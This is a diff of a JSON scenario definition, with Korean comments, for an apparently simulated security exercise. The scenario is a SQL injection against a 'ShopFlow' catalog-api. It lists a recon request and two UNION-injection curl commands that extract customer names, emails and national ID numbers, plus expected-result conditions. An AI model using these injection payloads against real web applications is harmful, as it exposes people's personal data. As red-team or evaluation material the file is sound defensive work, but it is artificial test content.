@@ -1,28 +1,34 @@
 {
   "_note": "핵심층 환경 — ShopFlow catalog-api SQL Injection(A1). 공개 웹 상품검색 엔드포인트에 UNION 인젝션으로 customers PII 를 직접 반출. catalog-api 는 shopflow_app role(customers SELECT 권한 있음, internal_secrets 는 없음)로 접속하므로 customers 가 타깃. 메인 킬체인(①wiki→②SA→③NP→④psql)이 add_networkpolicy database 로 막혀도 catalog-api 는 backend 네임스페이스라 정상 DB 접속 권한이 살아있어 우회된다 — 공진화 대체 경로의 핵심.",
-
   "env": "shopflow-sqli",
-  "technique": "T1190",
+  "technique": "WEB_SQLI",
   "cwe": "CWE-89",
-
   "procedure": {
     "id": "PROC-shopflow-sqli",
     "name": "catalog-api SQL Injection 으로 고객 PII 반출",
     "description": "frontend 발판에서 catalog-api /api/products?q= 에 UNION 인젝션. products 테이블은 5컬럼(id INT,name TEXT,category TEXT,price INT,stock INT)이라 UNION SELECT 도 5컬럼·같은 타입으로 맞춘다. shopflow_app role 은 customers 에만 SELECT 권한이 있고 internal_secrets 는 접근 불가이므로 customers(PII: name,email,phone,ssn) 를 노린다. ★ NetworkPolicy 가 database 네임스페이스를 막아도 catalog-api 는 backend 에서 정상 DB 접속(shopflow_app role)으로 쿼리를 실행하므로 우회된다.",
     "status": "AUTHORED",
     "steps": [
-      {"id": "STEP-sqli-recon", "seq": 1,
-       "command": "curl -s http://catalog-api.backend.svc.cluster.local:8080/api/products",
-       "description": "정상 응답으로 컬럼 수(5: id INT, name TEXT, category TEXT, price INT, stock INT)와 JSON 구조를 확인한다"},
-      {"id": "STEP-sqli-pii", "seq": 2,
-       "command": "curl -sG http://catalog-api.backend.svc.cluster.local:8080/api/products --data-urlencode \"q=' UNION SELECT id,name,email,0,0 FROM customers-- \"",
-       "description": "UNION 인젝션으로 customers 테이블의 PII 반출(크라운). 5컬럼 타입 맞춤: id=id(INT), name=name(TEXT), category←email(TEXT), price←0(INT), stock←0(INT). shopflow_app role 이 customers SELECT 권한이 있어 성공한다"},
-      {"id": "STEP-sqli-ssn", "seq": 3,
-       "command": "curl -sG http://catalog-api.backend.svc.cluster.local:8080/api/products --data-urlencode \"q=' UNION SELECT id,name,ssn,0,0 FROM customers-- \"",
-       "description": "주민번호(ssn) 반출. category 필드에 ssn 이 나온다. 이 쿼리가 crown_exfil(customers_pii) 자백을 발생시킨다"}
+      {
+        "id": "STEP-sqli-recon",
+        "seq": 1,
+        "command": "curl -s http://catalog-api.backend.svc.cluster.local:8080/api/products",
+        "description": "정상 응답으로 컬럼 수(5: id INT, name TEXT, category TEXT, price INT, stock INT)와 JSON 구조를 확인한다"
+      },
+      {
+        "id": "STEP-sqli-pii",
+        "seq": 2,
+        "command": "curl -sG http://catalog-api.backend.svc.cluster.local:8080/api/products --data-urlencode \"q=' UNION SELECT id,name,email,0,0 FROM customers-- \"",
+        "description": "UNION 인젝션으로 customers 테이블의 PII 반출(크라운). 5컬럼 타입 맞춤: id=id(INT), name=name(TEXT), category←email(TEXT), price←0(INT), stock←0(INT). shopflow_app role 이 customers SELECT 권한이 있어 성공한다"
+      },
+      {
+        "id": "STEP-sqli-ssn",
+        "seq": 3,
+        "command": "curl -sG http://catalog-api.backend.svc.cluster.local:8080/api/products --data-urlencode \"q=' UNION SELECT id,name,ssn,0,0 FROM customers-- \"",
+        "description": "주민번호(ssn) 반출. category 필드에 ssn 이 나온다. 이 쿼리가 crown_exfil(customers_pii) 자백을 발생시킨다"
+      }
     ]
   },
-
   "preconditions": [
     {
       "id": "PRE-sqli-catalog-reachable",
@@ -30,15 +36,25 @@
       "description": "frontend 발판에서 catalog-api.backend.svc.cluster.local:8080 에 HTTP 요청을 보낼 수 있고, /api/products?q= 엔드포인트에 SQL Injection 취약점이 존재."
     }
   ],
-
   "expected_results": [
     {
       "id": "ER-sqli-crown",
       "name": "SQL Injection 으로 민감 데이터 반출 (크라운)",
       "kind": "crown",
-      "outcome": {"id": "AO-data-exposure", "name": "민감 데이터 유출"},
+      "outcome": {
+        "id": "AO-data-exposure",
+        "name": "민감 데이터 유출"
+      },
       "conditions": [
-        {"channel": "crown", "field": "asset", "operator": "in", "expected": ["internal_secrets", "customers_pii"]}
+        {
+          "channel": "crown",
+          "field": "asset",
+          "operator": "in",
+          "expected": [
+            "internal_secrets",
+            "customers_pii"
+          ]
+        }
       ]
     }
   ]
